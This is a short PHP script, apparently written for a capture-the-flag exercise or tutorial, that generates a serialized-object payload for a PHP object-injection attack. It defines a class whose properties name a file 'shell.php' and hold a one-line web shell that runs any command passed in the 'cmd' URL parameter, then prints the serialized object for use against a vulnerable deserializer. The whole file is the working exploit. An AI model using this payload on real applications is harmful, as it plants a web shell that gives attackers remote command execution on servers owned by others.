<?php
  class WebApp {
    public $logfile = "shell.php";
    public $logdata = '<?php system($_GET["cmd"]); ?>';
  }
 
  $obj = new WebApp;
  echo htmlspecialchars(serialize($obj));
?>
